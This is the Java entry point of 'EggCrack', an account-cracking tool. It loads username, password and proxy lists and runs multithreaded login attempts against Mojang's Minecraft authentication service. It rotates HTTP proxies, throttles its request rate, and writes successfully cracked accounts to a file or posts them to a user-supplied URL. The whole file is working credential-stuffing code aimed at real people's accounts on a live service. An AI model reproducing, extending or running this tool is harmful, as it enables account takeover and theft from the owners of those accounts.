package net.teamlixo.eggcrack;

import com.google.gson.Gson;
import com.mojang.authlib.Agent;
import joptsimple.ArgumentAcceptingOptionSpec;
import joptsimple.OptionParser;
import joptsimple.OptionSet;
import net.teamlixo.eggcrack.account.Account;
import net.teamlixo.eggcrack.account.output.AccountOutput;
import net.teamlixo.eggcrack.account.output.FileAccountOutput;
import net.teamlixo.eggcrack.account.output.UrlAccountOutput;
import net.teamlixo.eggcrack.authentication.AuthenticationService;
import net.teamlixo.eggcrack.config.Configuration;
import net.teamlixo.eggcrack.config.JsonConfiguration;
import net.teamlixo.eggcrack.credential.Credential;
import net.teamlixo.eggcrack.credential.Credentials;
import net.teamlixo.eggcrack.list.ExtendedList;
import net.teamlixo.eggcrack.list.array.ExtendedArrayList;
import net.teamlixo.eggcrack.mojang.MinecraftAccount;
import net.teamlixo.eggcrack.mojang.MojangAuthenticationFactory;
import net.teamlixo.eggcrack.mojang.MojangAuthenticationService;
import net.teamlixo.eggcrack.objective.Objective;
import net.teamlixo.eggcrack.objective.ObjectiveCompleted;
import net.teamlixo.eggcrack.objective.ObjectiveRequests;
import net.teamlixo.eggcrack.objective.ObjectiveTime;
import net.teamlixo.eggcrack.session.Session;
import net.teamlixo.eggcrack.session.Tracker;
import net.teamlixo.eggcrack.ui.UserInterface;

import javax.swing.*;
import javax.swing.event.HyperlinkEvent;
import javax.swing.event.HyperlinkListener;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.util.Calendar;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.ConsoleHandler;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;

public final class Main {
    public static final void main(String[] args) throws
            IOException, ClassNotFoundException, UnsupportedLookAndFeelException,
            InstantiationException, IllegalAccessException {

        //Prefer IPv4 stack. Fixes some issues.
        System.setProperty("java.net.preferIPv4Stack", "true");

        //Configure the logger (It's just going to output to console)
        Session.LOGGER = Logger.getLogger("EggCrack");
        ConsoleHandler consoleHandler = new ConsoleHandler();
        consoleHandler.setFormatter(new LineLogFormatter());
        Session.LOGGER.addHandler(consoleHandler);
        Session.LOGGER.setUseParentHandlers(false);
        Session.LOGGER.setLevel(Level.ALL);

        //Read in parameters.
        OptionParser optionsParser = new OptionParser();

        ArgumentAcceptingOptionSpec consoleArgument = optionsParser.accepts("console").withOptionalArg();
        ArgumentAcceptingOptionSpec debugArgument = optionsParser.accepts("debug").withOptionalArg();
        ArgumentAcceptingOptionSpec configArgument = optionsParser.accepts("config").withRequiredArg().ofType(String.class).defaultsTo("eggcrack.json");

        ArgumentAcceptingOptionSpec proxyArgument = optionsParser.accepts("proxies").withRequiredArg().ofType(String.class).defaultsTo("proxies.txt");
        ArgumentAcceptingOptionSpec usernameArgument = optionsParser.accepts("usernames").withRequiredArg().ofType(String.class).defaultsTo("usernames.txt");
        ArgumentAcceptingOptionSpec passwordArgument = optionsParser.accepts("passwords").withRequiredArg().ofType(String.class).defaultsTo("passwords.txt");

        ArgumentAcceptingOptionSpec threadsArgument = optionsParser.accepts("threads").withRequiredArg().ofType(Integer.class).defaultsTo(Integer.valueOf(32));
        ArgumentAcceptingOptionSpec intervalArgument = optionsParser.accepts("interval").withRequiredArg().ofType(Integer.class).defaultsTo(Integer.valueOf(10));
        ArgumentAcceptingOptionSpec checkArgument = optionsParser.accepts("checkUrl").withOptionalArg().ofType(String.class);

        ArgumentAcceptingOptionSpec completedObjectiveArgument = optionsParser.accepts("objectiveCompleted").withOptionalArg().ofType(Integer.class);
        ArgumentAcceptingOptionSpec timeObjectiveArgument = optionsParser.accepts("objectiveSeconds").withOptionalArg().ofType(Integer.class);
        ArgumentAcceptingOptionSpec requestObjectiveArgument = optionsParser.accepts("objectiveRequests").withOptionalArg().ofType(Integer.class);

        ArgumentAcceptingOptionSpec fileOutputArgument = optionsParser.accepts("outputFile").withOptionalArg().ofType(String.class);
        ArgumentAcceptingOptionSpec urlOutputArgument = optionsParser.accepts("outputUrl").withOptionalArg().ofType(String.class);

        ArgumentAcceptingOptionSpec logFileArgument = optionsParser.accepts("logFile").withOptionalArg().ofType(String.class);
        ArgumentAcceptingOptionSpec logLevelArgument = optionsParser.accepts("logLevel").withOptionalArg().ofType(String.class).defaultsTo("warn");

        OptionSet optionSet = optionsParser.parse(args);

        if (optionSet.has(debugArgument)) {
            consoleHandler.setLevel(Level.FINEST);
            Session.LOGGER.fine("Console debugging enabled.");
        } else consoleHandler.setLevel(Level.INFO);

        File file = new File((String) optionSet.valueOf(configArgument));
        Configuration configuration = (new Gson()).fromJson(new InputStreamReader(new FileInputStream(file)), JsonConfiguration.class);
        String branch = ((JsonConfiguration)configuration).getUpdateBranch();
        int version = configuration.getVersion();

        System.out.println("EggCrack build " + configuration.getVersion() + ", Copyright (C) Team Lixo");
        System.out.println("EggCrack comes with ABSOLUTELY NO WARRANTY. This is free software,");
        System.out.println("and you are welcome to redistribute it under certain conditions.");
        System.out.println("");

        final boolean guiAvailable = Desktop.isDesktopSupported() && !GraphicsEnvironment.isHeadless();
        boolean guiEnabled = !optionSet.has(consoleArgument);

        if (configuration.isUpdateEnabled() && (branch.equals("beta") || branch.equals("stable"))) {
            Session.LOGGER.fine("Checking for updates to build #" + version + " on branch " +  branch + "...");

            try {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(configuration.getUpdateURL().openStream()));
                int remoteVersion = Integer.parseInt(bufferedReader.readLine());
                if (remoteVersion > 0 && remoteVersion > version) {
                    Session.LOGGER.warning("A newer version of EggCrack is available: build #" + remoteVersion + ".");
                    Session.LOGGER.warning("Download at GitHub: https://github.com/Manevolent/EggCrack");

                    if (guiEnabled) {
                        JLabel label = new JLabel();

                        JEditorPane ep = new JEditorPane("text/html",
                                "<html>An update for EggCrack is available for download online. " +
                                "If you would like to download this update, please visit our GitHub page:<br/><br/>" +
                                "<a href=\"https://github.com/Manevolent/EggCrack\">https://github.com/Manevolent/EggCrack</a><br/>" +
                                "Current build: #" + version + "<br/><b>Updated build: #" + remoteVersion + " (branch: " + branch + ")</b><br/><br/>" +
                                "If you would not like to be notified with these messages, see your eggcrack.json configuration.<br/><br/></html>"
                        );

                        ep.setBackground(label.getBackground());
                        ep.setEditable(false);
                        ep.addHyperlinkListener(new HyperlinkListener()
                        {
                            @Override
                            public void hyperlinkUpdate(HyperlinkEvent e)
                            {
                                if (e.getEventType().equals(HyperlinkEvent.EventType.ACTIVATED))
                                    if (guiAvailable)
                                    {
                                        try {
                                            Desktop.getDesktop().browse(e.getURL().toURI());
                                            System.exit(0);
                                        } catch (IOException e1) {
                                        } catch (URISyntaxException e1) {
                                        }
                                    }
                            }
                        });

                        JOptionPane.showMessageDialog(null, ep);
                    }
                } else {
                    Session.LOGGER.fine("Update check complete; no new versions found.");
                }
            } catch (Exception ex) {
                Session.LOGGER.warning("Problem retrieving updates from the repository:");
                ex.printStackTrace();
            }
        }

        if (guiEnabled) {
            if (!guiAvailable)
                throw new UnsupportedOperationException("Desktop environment not supported on this system.");

            Session.LOGGER.info("Skipping console arguments and launching in GUI-mode...");

            UserInterface.main(args);
            return;
        }

        int threads = (Integer) optionSet.valueOf(threadsArgument);
        float interval = ((Integer) optionSet.valueOf(intervalArgument)) / 1f;
        URL checkUrl = null;
        if (optionSet.has(checkArgument)) {
            try {
                checkUrl = URI.create(optionSet.valueOf(checkArgument).toString()).toURL();
            } catch (MalformedURLException e) {
                e.printStackTrace();
                return;
            } catch (IllegalArgumentException e) {
                e.printStackTrace();
                return;
            }
        }

        Session.LOGGER.fine("[Options] threads=" + threads);
        Session.LOGGER.fine("[Options] interval=" + interval + " requests/sec");

        ExtendedList<Objective> objectiveList = new ExtendedArrayList<Objective>();
        if (optionSet.has(completedObjectiveArgument))
            objectiveList.add(new ObjectiveCompleted((Integer) optionSet.valueOf(completedObjectiveArgument)));
        if (optionSet.has(timeObjectiveArgument))
            objectiveList.add(new ObjectiveTime((Integer) optionSet.valueOf(timeObjectiveArgument)));
        if (optionSet.has(requestObjectiveArgument))
            objectiveList.add(new ObjectiveRequests((Integer) optionSet.valueOf(requestObjectiveArgument)));

        if (objectiveList.size() <= 0) {
            Session.LOGGER.warning("No objectives provided! Session will continue until all accounts are attempted.");
        } else {
            Session.LOGGER.fine("[Options] objectives=" + objectiveList.size());
        }

        ExtendedList<AccountOutput> outputList = new ExtendedArrayList<AccountOutput>();
        if (optionSet.has(fileOutputArgument))
            outputList.add(new FileAccountOutput(new File(optionSet.valueOf(fileOutputArgument).toString())));
        if (optionSet.has(urlOutputArgument))
            outputList.add(new UrlAccountOutput(URI.create(optionSet.valueOf(urlOutputArgument).toString()).toURL()));

        if (outputList.size() <= 0) {
            Session.LOGGER.warning("No outputs provided! Recovered accounts will not be saved.");
        } else {
            Session.LOGGER.fine("[Options] outputs=" + outputList.size());
        }

        if (optionSet.has(logFileArgument)) {
            try {
                FileHandler fileHandler = new FileHandler(optionSet.valueOf(logFileArgument).toString());
                fileHandler.setFormatter(new LineLogFormatter());

                String level = optionSet.valueOf(logLevelArgument).toString().trim();

                if (level.equalsIgnoreCase("info")) {
                    fileHandler.setLevel(Level.INFO);
                } else if (level.equalsIgnoreCase("warn")) {
                    fileHandler.setLevel(Level.WARNING);
                } else if (level.equalsIgnoreCase("severe")) {
                    fileHandler.setLevel(Level.SEVERE);
                } else {
                    Session.LOGGER.severe("Unknown log level (info/warn/severe): " + level.toLowerCase() + ".");
                    return;
                }

                Session.LOGGER.info("Logging enabled; appending " + level.toUpperCase() + " entries to " + (new File(optionSet.valueOf(logFileArgument).toString())).getAbsolutePath());
                Session.LOGGER.addHandler(fileHandler);
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
        }

        Session.LOGGER.info("Starting EggCrack at " + Calendar.getInstance().getTime().toString() + "...");

        //Set up the executor service responsible for executing threads.
        ExecutorService executorService = Executors.newFixedThreadPool(
                threads,
                new AuthenticatorThreadFactory(Thread.MIN_PRIORITY)
        );

        Tracker tracker = new Tracker();

        //Set up the Minecraft authentication service responsible for authenticating accounts.
        AuthenticationService authenticationService = new MojangAuthenticationService();

        //Import accounts from file.
        ExtendedList<Account> accountList = new ExtendedArrayList<Account>();
        File usernameFile = new File(optionSet.valueOf(usernameArgument).toString());
        BufferedReader usernameReader = new BufferedReader(new FileReader(usernameFile));
        while (usernameReader.ready())
            accountList.add(new MinecraftAccount(usernameReader.readLine().trim()));
        usernameReader.close();
        Session.LOGGER.info("Loaded " + accountList.size() + " accounts (" + usernameFile.getAbsolutePath() + ").");

        //Import credentials from file.
        ExtendedList<Credential> credentialList = new ExtendedArrayList<Credential>();
        File passwordFile = new File(optionSet.valueOf(passwordArgument).toString());
        BufferedReader passwordReader = new BufferedReader(new FileReader(passwordFile));
        while (passwordReader.ready())
            credentialList.add(Credentials.createPassword(passwordReader.readLine().trim()));
        passwordReader.close();
        Session.LOGGER.info("Loaded " + credentialList.size() + " passwords (" + passwordFile.getAbsolutePath() + ").");

        //Import proxies from file.
        ExtendedList<Proxy> proxyList = new ExtendedArrayList<Proxy>();
        File proxyFile = new File(optionSet.valueOf(proxyArgument).toString());
        BufferedReader proxyReader = new BufferedReader(new FileReader(proxyFile));
        while (proxyReader.ready()) {
            String[] proxyLine = proxyReader.readLine().split(":");
            try {
                proxyList.add(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyLine[0], Integer.parseInt(proxyLine[1]))));
            } catch (Exception ex) {
                Session.LOGGER.warning("Problem loading proxy: " + ex.getMessage());
            }
        }
        proxyReader.close();
        Session.LOGGER.info("Loaded " + proxyList.size() + " proxies (" + proxyFile.getAbsolutePath() + ").");

        //Initialize the EggCrack instance to create a credential store.
        final Session session = new Session(
                executorService,
                authenticationService,
                accountList,
                credentialList,
                proxyList,
                objectiveList,
                outputList,
                tracker,
                checkUrl
        );

        //Run EggCrack.
        session.run();
    }
}
